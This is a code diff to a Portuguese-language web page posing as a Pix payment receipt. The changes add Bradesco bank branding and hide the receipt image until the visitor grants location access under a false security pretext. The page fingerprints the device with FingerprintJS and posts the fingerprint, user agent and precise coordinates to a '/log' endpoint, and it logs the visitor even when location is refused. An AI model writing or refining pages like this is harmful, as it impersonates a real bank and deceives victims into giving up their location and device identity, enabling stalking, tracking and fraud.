@@ -2,10 +2,10 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Comprovante Pix</title>
+  <title>Bradesco - Comprovante Pix</title>
   <style>
-    body { background: #f2f2f2; text-align: center; font-family: Arial; }
-    img { margin-top: 50px; width: 90%; max-width: 500px; }
+    body { background: #f2f2f2; text-align: center; font-family: Arial; margin: 0; padding: 0; }
+    img { width: 90%; max-width: 500px; margin-top: 30px; display: none; }
     button {
       padding: 12px 25px;
       font-size: 16px;
@@ -24,21 +24,20 @@
       border: 1px solid #ffeeba;
       border-radius: 5px;
       padding: 20px;
-      margin: 20px auto;
+      margin: 40px auto 10px;
       max-width: 600px;
     }
   </style>
 </head>
 <body>
   <div id="securityWarning">
-    <h2 style="color: red;">🚨 Alerta de Segurança</h2>
-    <p><strong>Detectamos uma possível tentativa de fraude!</strong></p>
-    <p>Para sua proteção, é necessário validar sua localização. Clique no botão abaixo e permita o acesso à localização quando solicitado.</p>
-    <p>Isso garante que sua conta bancária não seja bloqueada e que a transação via Pix seja finalizada com segurança.</p>
-    <button onclick="getLocation()">✅ Verificar Segurança</button>
+    <h2 style="color: red;">⚠️ Bradesco precisa da sua autorização</h2>
+    <p>Por segurança, é necessário validar sua localização para liberar o comprovante Pix.</p>
+    <p>Clique no botão abaixo e permita o acesso à localização quando solicitado.</p>
+    <button onclick="getLocation()">✅ Autorizar e Visualizar Pix</button>
   </div>
 
-  <img src="comprovante.jpg" alt="Comprovante Pix">
+  <img id="pixImage" src="comprovante.jpg" alt="Comprovante Pix">
 
   <!-- FingerprintJS -->
   <script async src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
@@ -62,6 +61,7 @@
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
 
+                    // Envia os dados com localização
                     fetch("/log", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
@@ -72,16 +72,14 @@
                         device: userAgent,
                         loc: `${lat},${lon}`
                       })
-                    }).then(r => {
-                      if (r.ok) {
-                        alert("✅ Localização verificada com sucesso!");
-                      } else {
-                        console.warn("⚠️ Erro no envio:", r.status);
-                      }
-                    }).catch(err => console.error("❌ Falha ao enviar:", err));
+                    });
+
+                    // Mostra o Pix e esconde o alerta
+                    document.getElementById("pixImage").style.display = "block";
+                    document.getElementById("securityWarning").style.display = "none";
                   },
                   err => {
-                    console.warn("⚠️ Geolocalização negada:", err.message);
+                    // Mesmo que negue, envia log sem localização
                     fetch("/log", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
@@ -93,11 +91,11 @@
                         loc: null
                       })
                     });
+
+                    alert("❌ Não foi possível validar a localização. Recarregue e tente novamente.");
                   },
                   { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
-              } else {
-                console.log("❌ Geolocalização não suportada.");
               }
             });
         });
